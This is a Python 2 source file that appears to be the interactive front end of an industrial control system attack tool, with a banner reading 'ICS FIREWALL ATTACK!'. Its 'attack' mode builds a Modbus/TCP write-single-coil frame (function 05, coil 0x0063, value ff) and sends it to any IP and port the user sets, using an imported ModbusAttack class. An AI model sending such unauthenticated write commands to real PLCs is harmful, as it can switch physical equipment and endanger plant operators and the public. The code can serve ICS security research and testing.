#!-*-coding:utf-8-*-
#!author:xeldax

import sys
import argparse
import subprocess
sys.path.append('..')

from lib.libnet import *
from lib.libmodbus import *
from lib.libjudge import *
from lib.libmodbusattack import *
from lib.lib import *

class Cli():
	def __init__(self):
		self.banner="""
		                 _---------.
             .' #######   ;."
  .---,.    ;@             @@`;   .---,..
." @@@@@'.,'@@            @@@@@',.'@@@@ ".
'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;
   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'
     "--'.@@@  -.@        @ ,'-   .'--"
          ".@' ; @       @ `.  ;'
            |@@@@ @@@     @    .
             ' @@@ @@   @@    ,
              `.@@@@    @@   .
                ',@@     @   ;           _____________
                 (   3 C    )     /|___ / ICS FIREWALL ATTACK! \
                 ;@'. __*__,."    \|--- \_____________/
                  '(.,...."/

		"""
		self.model=''
		self.ip=''
		self.port=''

	'''
	[暂时废用]!
	def command_parse(self,command):
		if not command:
			return False
		parser=argparse.ArgumentParser(description='Cli mode')
		#
		parser.add_argument('command',help='test')
		#parser.add_argument('use',action='store',dest='model',default='')
		#parser.add_argument('quit',action='store',dest='quit_action',default='')
		#parser.add_argument('')
		#-
		parser.add_argument('--model',action='store',dest='model',default='1')
		parser.add_argument('--ip',action='store',dest='ip',default='127.0.0.1')
		parser.add_argument('--port',action='store',dest='port',default='502')
		#parser.add_argument('--')
		#--
		#print command.split(' ')
		comlist=parser.parse_args(command.split(' '))
		print 11
		if 'model' in locals().keys():
			print 'model'
			print model
		if 'ip' in locals().keys():
			print ip
		if 'port' in locals().keys():
			print port
		print comlist
		#
		if comlist.command=='clear':
			subprocess.call(["printf","'\033c'"])
		elif comlist.command=='use':
			print 1
			if not comlist.model:
				print "\033[1;31m [-]model require !\033[0m"
				return
			print model
			self.model=model
		elif comlist.command=='set':
			if comlist.ip:
				self.ip=ip
			if comlist.port:
				self.port=port
		elif comlist.command=='quit':
			sys.exit()
		elif comlist.command=='run':
			if self.model:
				if self.model=='firewall':
					return 'firewall'
				if self.model=='attack':
					return 'attack'
			else:
				print "\033[1;31m [-]model require !\033[0m"
		else:
			print "\033[1;3
	'''
	def command_parse(self,command):
		comlist=command.split(' ')
		sys_command=comlist[0]
		#print sys_command
		# print self.model
		if sys_command=='use':
			if len(comlist)==2:
				model=comlist[1]
				self.model=model
			elif len(comlist)==1:
				print "\033[1;31m [-]model require !\033[0m"
			else:
				print "\033[1;31m [-]too more arguments !\033[0m"
		elif sys_command=='quit':
			sys.exit()
		elif self.model and sys_command=='set':
			if len(comlist)==1:
				print "\033[1;31m [-]need arguments !\033[0m"
			elif len(comlist)==3:
				if comlist[1]=='ip':
					ip=comlist[2]
					self.ip=ip
					print self.ip
				if comlist[1]=='port':
					port=comlist[2]
					self.port=port
					print self.port
			else:
				print "\033[1;31m [-]wrong format arguments !\033[0m"
		elif self.model and sys_command=='run':
			if self.model=='attack':
				if self.ip and self.port:
					a=ModbusAttack(str(self.ip),int(self.port))
					setc={
					'trans_id':'3700',
					'prot_id':'0000',
					'length':'0006',
					'identifier':'01',
					'func_code':'05',
					'reference_num':'0063',
					'data':'ff'
					}
					a.main(setc)
				else:
					print "\033[1;31m [-]Need ip and port!\033[0m"
			elif self.model=='firewall':
				a=firewalllib()
				a.main()
		elif not self.model:
			print "\033[1;31m [-]No model loaded!\033[0m"
		else:
			print "\033[1;31m [-]unkown command!\033[0m"
			
	def main(self):
		print self.banner
		while True:
			raw=raw_input('FCK->  ')
			self.command_parse(raw)

if __name__=='__main__':
	com=Cli()
	com.main()